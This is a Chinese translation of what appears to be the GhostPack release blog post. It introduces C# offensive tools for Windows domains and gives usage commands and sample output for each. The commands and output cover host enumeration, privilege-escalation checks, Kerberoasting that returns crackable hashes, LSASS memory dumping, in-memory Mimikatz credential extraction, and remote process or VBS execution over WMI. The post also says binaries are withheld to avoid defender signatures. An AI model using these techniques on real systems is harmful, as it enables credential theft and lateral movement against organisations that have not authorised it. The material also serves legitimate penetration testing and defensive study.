# 工具包

## **GhostPack**

Ghostpack (目前)是以前 PowerShell 功能的各种 C# 实现的集合，包括今天发布的六个独立的工具集—— [Seatbelt](https://github.com/GhostPack/Seatbelt/), [SharpUp](https://github.com/GhostPack/SharpUp/), [SharpRoast](https://github.com/GhostPack/SharpRoast/), [SharpDump](https://github.com/GhostPack/SharpDump/), [SafetyKatz](https://github.com/GhostPack/SafetyKatz/), 和 [SharpWMI](https://github.com/GhostPack/SharpWMI/)。 所有这些项目都将托管在 [GhostPack](http://github.com/GhostPack/) 的 GitHub 代码仓库中，每个项目作为一个独立的存储库分离出来。

附带说明: GhostPack 并不打算只用 C# 代码，也不是纯粹的进攻性工具包，尽管今天发布的项目都是 C# 代码。我们的计划是让组织容纳许多与安全相关的项目，并且希望这些项目不是 PowerShell 相关的。 此外，为了防止防御者构建签名检测该工具包(请考虑标记各个作者的 Twitter 用户名:) ，我们目前不打算为任何项目发布二进制文件。 然而，所有的东西都是与 Visual Studio Community 2015 兼容的，所以你很容易就可以自己构建。

充分披露: 这几乎不是什么"新"的东西，只是许多人多年来一直使用的相同技术的不同实现。 此外，这里的所有代码都应该被认为是 beta 版——它已经进行了一些测试，但仍然存在大量的 bug)

## **安全带（Seatbelt）**

[Seatbelt](https://github.com/GhostPack/Seatbelt/) 是迄今为止发布的最丰富的一个项目。 这是一个态势感知安全检查的交换所。 也就是说，它管理主机数据的收集，这些数据从进攻和防守的角度来看都可能是有趣的。 从 PowerShell 安全设置，到当前用户的 Kerberos 票证，到删除的回收站项目，以及更多(当前检查项有40+!)

安全带在它的[README.md](https://github.com/GhostPack/Seatbelt/blob/master/README.md)文件中描述了大量已经实现的功能，并且已经证明它在我们的渗透活动中非常有用。 它深受[@tifkin\_](https://twitter.com/tifkin_)的 [Get-HostProfile.ps1](https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-HostProfile.ps1)  以及[@andrewchiles](https://twitter.com/andrewchiles) 的[HostEnum.ps1](https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1)  PowerShell 脚本的影响。

SeatBelt.exe会收集以下系统数据:

* &#x20;BasicOSInfo ——基本操作系统信息(即架构、操作系统版本等)
* RebootSchedule ——基于事件 id 12和13的系统重新启动计划任务(最后15天)
* TokenGroupPrivs——当前进程或令牌的特权(例如 SeDebugPrivilege 等)
* UACSystemPolicies ——UAC 系统策略——通过注册表设置的 UAC 系统策略
* PowerShellSettings —— PowerShell 版本和通过注册表进行的安全设置
* AuditSettings — ——通过注册表进行的审计设置
* WEFSettings ——通过注册表进行 Windows 事件转发(Windows Event Forwarding)的设置
* LSASettings ——LSA 设置(包括认证包)
* UserEnvVariables ——当前用户环境变量
* SystemEnvVariables ——当前系统环境变量
* UserFolders —— C:\Users\下的文件夹
* NonstandardServices——非标准服务——二进制文件路径不在 C:\Windows\  中的服务
* InternetSettings ——IE设置，包括代理服务器配置
* LapsSettings ——LAPS 设置(如果已安装)
* LocalGroupMembers ——本地管理员、 RDP 和远程 DCOM 组的成员
* MappedDrives ——当前映射的驱动器
* RDPSessions ——当前传入的 RDP 会话
* WMIMappedDrives ——通过 WMI 映射的驱动器
* NetworkShares ——网络共享
* FirewallRules ——防火墙拒绝规则，完整导出所有规则
* AntiVirusWMI ——已注册的反病毒软件(通过 WMI)
* InterestingProcesses ——"趣味"进程ー防御性产品和管理工具
* RegistryAutoLogon——注册表中的自动登录信息
* RegistryAutoRuns ——注册表中的自动运行信息
* DNSCache —— DNS 缓存条目(通过 WMI)
* ARPTable ——列出当前的 ARP 表和适配器信息(等价于 ARP-a)
* AllTcpConnections ——列出当前的 TCP 连接和相关进程
* AllUdpConnections ——列出当前 UDP 连接和相关进程
* NonstandardProcesses——进程的二进制路径不在 C:\Windows\中的进程

如果用户处于高度完整状态，则运行以下附加操作:

* SysmonConfig——来自注册表的 Sysmon 配置

SeatBelt.exe user 命令会收集以下用户数据:

* 检查 Firefox 是否有历史文件
* 检查 Chrome 是否有历史文件
* TriageIE ——IE浏览器书签和最后七天的历史记录
* SavedRDPConnections ——已保存的 RDP 连接，包括用户名
* RecentRunCommands ——最近"运行"的命令
* PuttySessions ——已保存的 Putty 配置
* PuttySSHHostKeys—— 已保存的 putty SSH 主机密钥
* RecentFiles ——解析最近七天的「最近文件」快捷方式

如果用户处于高度完整性状态，这些检查将针对所有用户而不仅仅针对当前用户。

其他杂项:

* CurrentDomainGroups —当前用户的本地用户组和域用户组
* Patches — 通过 WMI 安装的补丁(在某些系统上需要)
* LogonSessions —用户登录会话数据
* KerberosTGTData ——列出所有的 TGT 票证
* InterestingFiles ——与用户文件夹中的各种模式相匹配的文件
* IETabs ——打开 Internet Explorer 浏览器标签页
* TriageChrome—— Chrome 浏览器书签和历史
* TriageFirefox ——Firefox 历史记录(无书签)
* RecycleBin ——过去30天内删除的回收站中的文件（只能在用户上下文中使用）
* KerberosTickets ——列出 Kerberos 票证，如果是特权升级的，则会列出所有按所有登录会话分组的票证
* 4624Events ——来自安全事件日志的4624登录事件
* 4648Events ——来自安全事件日志的4648登录事件

SeatBelt.exe all 会运行完整的枚举检查，可以与 full 参数组合使用。

SeatBelt.exe \[CheckName] \[CheckName2] … 将只运行一个或多个指定的检查(名称区分大小写!)

SeatBelt.exe \[system/user/all/CheckName] full 将阻止任何过滤，并返回完整的结果。 默认情况下，某些检查会被过滤(例如，不在 c:\Windows 的服务等等)

下面是一些系统集合的例子:

![你值得拥有的 PowerShell 内网渗透工具包——GhostPack](https://img.4hou.com/uploads/20190810/1565408023631362.png)

有很多的检查项和有趣的信息收集操作——我非常建议你运行这些参数，看看什么是适合你的！

## **SharpUp**

[SharpUp](https://github.com/GhostPack/SharpUp/) 是 [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) 利用 C# 实现权限提升检查的开始。 目前，只进行了最常见的检查，尚未实施武器化功能。 目前实现的检查如下:

* GetModifiableServices ——返回当前用户可以修改的服务
* GetModifiableServiceBinaries ——返回当前用户可以修改的二进制文件的服务
* GetAlwaysInstallElevated ——返回 AlwaysInstallElevated 注册表项的值
* GetPathHijacks ——返回当前用户可以修改的%PATH% 中的任何文件夹
* GetModifiableRegistryAutoRuns ——返回设置为在 HKLM 自动运行配置中运行的任何可修改的二进制文件或脚&#x672C;**·** GetSpecialTokenGroupPrivs ——返回”特殊"用户权限(如 SeDebugPrivilege等等)
* GetUnattendedInstallFiles ——返回任何剩余的无人参与的安装文件
* GetMcAfeeSitelistFiles ——返回 McAfee SiteList.xml 文件路径

下面是一个运行的例子:

```bash
C:\Temp>SharpUp.exe
=== SharpUp: Running Privilege Escalation Checks ===
=== Modifiable Services ===
Name 
            
: VulnSvc
DisplayName
      
: VulnSvc
Description
      
:
State
            
: Stopped
StartMode
        
: Auto
PathName 
        
: C:\Program Files\VulnSvc\VulnSvc.exe
=== Modifiable Service Binaries ===
Name 
            
: VulnSvc2
DisplayName
      
: VulnSvc22
Description
      
:
State
            
: Stopped
StartMode
        
: Auto
PathName 
        
: C:\VulnSvc2\VulnSvc2.exe
=== AlwaysInstallElevated Registry Keys ===
=== Modifiable Folders in %PATH% ===
Modifable %PATH% Folder
  
: C:\Go\bin
=== Modifiable Registry Autoruns ===
=== *Special* User Privileges ===
=== Unattended Install Files ===
=== McAfee Sitelist.xml Files ===
[*] Completed Privesc Checks in 18 seconds
```

## **SharpRoast**

[SharpRoast](https://github.com/GhostPack/SharpRoast/) 是 [PowerView 各种 Kerberoasting 功能的 C# 版本](https://github.com/PowerShellMafia/PowerSploit/blob/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1#L2574-L2774)。 [KerberosRequestorSecurityToken.GetRequest Method()](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest%28v=vs.110%29.aspx) 方法由[@machosec](https://twitter.com/machosec) 提供给 PowerView。哈希以 [hashcat](https://hashcat.net/hashcat/)  格式输出。

更多关于 Kerberoasting 的信息，包括 Tim Medin 关于这个主题的原始演讲的链接，请查看我2016年11月发表的博文——[“没有 Mimikatz 的 Kerberoasting"](http://kerberoasting/%20without%20mimikatz/)。

对当前域的所有用户进行Kerberoasting攻击:

```bash
C:\Temp>SharpRoast.exe all
SamAccountName         : harmj0y
DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
ServicePrincipalName   : asdf/asdfasdf
Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...

SamAccountName         : sqlservice
DistinguishedName      : CN=SQL,CN=Users,DC=testlab,DC=local
ServicePrincipalName   : MSSQLSvc/SQL.testlab.local
Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc/SQL.testlab.local*$9994D1...

...
```

在当前域中针对特定的 SPN发起Kerberoasting攻击:

```bash
C:\Temp>SharpRoast.exe "asdf/asdfasdf"
Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...
```

在当前域中针对某个特定的用户发起 Kerberoasting 攻击:

```bash
C:\Temp>SharpRoast.exe harmj0y
SamAccountName         : harmj0y
DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
ServicePrincipalName   : asdf/asdfasdf
Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...
```

对当前域中指定 OU 的用户进行Kerberoasting攻击:

```bash
C:\Temp>SharpRoast.exe "OU=TestingOU,DC=testlab,DC=local"
SamAccountName         : testuser2
DistinguishedName      : CN=testuser2,OU=TestingOU,DC=testlab,DC=local
ServicePrincipalName   : service/host
Hash                   : $krb5tgs$23$*$testlab.local$service/host*$08A6462...
```

在另一个(受信任的)的域的特定 SPN发起Kerberoasting攻击:

```bash
C:\Temp\>SharpRoast.exe "MSSQLSvc/SQL@dev.testlab.local"
Hash                   : $krb5tgs$23$*user$DOMAIN$MSSQLSvc/SQL@dev.testlab.local*$9994D148...
```

对另一个(受信任的)域中的所有用户执行Kerberoasting攻击:

```bash
C:\Temp>SharpRoast.exe "LDAP://DC=dev,DC=testlab,DC=local"
SamAccountName         : jason
DistinguishedName      : CN=jason,CN=Users,DC=dev,DC=testlab,DC=local
ServicePrincipalName   : test/test
Hash                   : $krb5tgs$23$*$dev.testlab.local$test/test*$9129566

...
```

这些命令中的任何一个都可以接受一个\[domain.com\user]\[password] ，以便使用显式凭证进行 Kerberoasting攻击。例如:

```bash
[domain.com\user][password] ，以便使用显式凭证进行 Kerberoasting攻击。例如:
C:\Temp>SharpRoast.exe harmj0y "testlab.local\dfm" "Password123!"
SamAccountName         : harmj0y
DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
ServicePrincipalName   : asdf/asdfasdf
Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...
```

如果遇到需要使用二次跳板机的情况，这可能很有用。

## **SharpDump**

[SharpDump](https://github.com/GhostPack/SharpDump/) 本质上是各种 [PowerSploit 的 Out-Minidump.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1)  的 C# 版本。[MiniDumpWriteDump](https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump) Win32 API 调用用于为指定的进程 ID (默认情况下为 LSASS)创建一个转储到 to C:\Windows\Temp\debug\<PID>.out 文件。GZipStream 用于将转储压缩为 C:\Windows\Temp\debug\<PID>.bin(.gz 格式) ，并删除原始的 minidump 文件。

转储 LSASS (默认值)的运行例子:

```
C:\Temp>SharpDump.exe

[*] Dumping lsass (808) to C:\WINDOWS\Temp\debug808.out
[+] Dump successful!

[*] Compressing C:\WINDOWS\Temp\debug808.out to C:\WINDOWS\Temp\debug808.bin gzip file
[*] Deleting C:\WINDOWS\Temp\debug808.out

[+] Dumping completed. Rename file to "debug808.gz" to decompress.

[*] Operating System : Windows 10 Enterprise N
[*] Architecture     : AMD64
[*] Use "sekurlsa::minidump debug.out" "sekurlsa::logonPasswords full" on the same OS/arch
```

转储一个特定的进程 ID的例子:

```bash
C:\Temp>SharpDump.exe 8700

[*] Dumping notepad++ (8700) to C:\WINDOWS\Temp\debug8700.out
[+] Dump successful!

[*] Compressing C:\WINDOWS\Temp\debug8700.out to C:\WINDOWS\Temp\debug8700.bin gzip file
[*] Deleting C:\WINDOWS\Temp\debug8700.out

[+] Dumping completed. Rename file to "debug8700.gz" to decompress.
```

如果转储 LSASS，则可以在转储后下载这个压缩的 minidump，并重命名为 dump\<PID>.gz，之后在一个类似的平台上运行 Mimikatz 的 sekurlsa::minidump命令:

![你值得拥有的 PowerShell 内网渗透工具包——GhostPack](https://img.4hou.com/uploads/20190810/1565408112966705.png)

## **SafetyKatz**

[SafetyKatz](https://github.com/GhostPack/SafetyKatz/) 是 SharpDump、[@gentilkiwi](https://twitter.com/gentilkiwi) 的 [Mimikatz](https://github.com/gentilkiwi/mimikatz/) 项目和[@subtee](https://twitter.com/subtee) 的[.NET PE loader](https://github.com/re4lity/subTee-gits-backups/blob/master/PELoader.cs) 项目的一个组合。

首先，[MiniDumpWriteDump](https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump) Win32 API 调用用于创建一个保存到 C:\Windows\Temp\debug.bin 的 LSASS 转储。 然后使用@subtee 的 PELoader 加载一个自定义版本的 Mimikatz，该版本对 minidump 文件运行 sekurlsa:: logonpassword 和 sekurlsa:: ekeys，在执行完成后会删除该文件。 这个操作可以使你能够从系统中提取密码，而不必传输数兆字节的 minidump 文件，但是这可以防止 Mimikatz 的特定 OpenProcess 附加到 LSASS 进程中。

```bash
C:\Temp>SafetyKatz.exe

[*] Dumping lsass (808) to C:\WINDOWS\Temp\debug.bin
[+] Dump successful!

[*] Executing loaded Mimikatz PE

.#####.   mimikatz 2.1.1 (x64) built on Jul  7 2018 03:36:26 - lil!
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  / *** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
'#####'        > http://pingcastle.com / http://mysmartlogon.com   *** /

mimikatz # Opening : 'C:\Windows\Temp\debug.bin' file for minidump...

Authentication Id : 0 ; 28935082 (00000000:01b983aa)
Session           : Interactive from 0
User Name         : blahuser
Domain            : WINDOWS10
Logon Server      : WINDOWS10
Logon Time        : 7/15/2018 1:07:55 PM
SID               : S-1-5-21-1473254003-2681465353-4059813368-1002
        msv :
        [00000003]
Primary
        * Username : blahuser
        * Domain   : WINDOWS10

...(snip)...

mimikatz # deleting C:\Windows\Temp\debug.bin
```

## **SharpWMI**

最后一个小工具([SharpWMI](https://github.com/GhostPack/SharpWMI/))是一个各种 WMI 功能的简单 C# 包装器。 它允许通用的远程(或本地) WMI 查询、通过 Win32\_Process 的远程进程执行以及通过"临时"永久 WMI 事件订阅的远程 VBS 执行。

```
Local system enumeration  :
    SharpWMI.exe action=query query="select * from win32_service" [namespace=BLAH]
    Ex: SharpWMI.exe action=query query="select * from win32_process"
    Ex: SharpWMI.exe action=query query="SELECT * FROM AntiVirusProduct" namespace="root\SecurityCenter2"

Remote system enumeration :
    SharpWMI.exe action=query computername=HOST1[,HOST2,...] query="select * from win32_service" [namespace=BLAH]
    Ex: SharpWMI.exe action=query computername=primary.testlab.local query="select * from win32_service"
    Ex: SharpWMI.exe action=query computername=primary,secondary query="select * from win32_process

Remote process creation   :
    SharpWMI.exe action=create computername=HOST[,HOST2,...] command="C:\temp\process.exe [args]"
    Ex: SharpWMI.exe action=create computername=primary.testlab.local command="powershell.exe -enc ZQBj..."

Remote VBS execution      :
    SharpWMI.exe action=executevbs computername=HOST[,HOST2,...]
    Ex: SharpWMI.exe action=executevbs computername=primary.testlab.local
```

这个工具里面没有什么革命性的东西，但 WMI 事件订阅方法可以很好地服务于我们。 基于计时器的事件订阅是在远程系统上创建的，因此任意的 VBS 脚本都可以作为 ActiveScriptEventConsumer 的有效载荷。 事件触发器被触发后，你的 VBS 会被执行，之后一切都会被清理干净:

```
C:\Temp>SharpWMI.exe action=executevbs computername=primary.testlab.local

[*] Creating 'Timer' object on primary.testlab.local
[*] Setting 'Debug' event filter on primary.testlab.local
[*] Setting 'Debug' event consumer on primary.testlab.local
[*] Binding 'Debug' event filter and consumer on primary.testlab.local

[*] Waiting 45 seconds for event to trigger on primary.testlab.local ...

[*] Removing 'Timer' internal timer from primary.testlab.local
[*] Removing FilterToConsumerBindingr from primary.testlab.local
[*] Removing 'Debug' event filter from primary.testlab.local
[*] Removing 'Debug' event consumer from primary.testlab.local
```

可以使用eventname=BLAH参数修改过滤器或使用者名称。 如果要更改执行的 VBS 脚本，请在编译之前修改项目顶部的 vbsPayload 字符串。 推荐使用 [DotNetToJScript](https://github.com/tyranid/DotNetToJScript)。
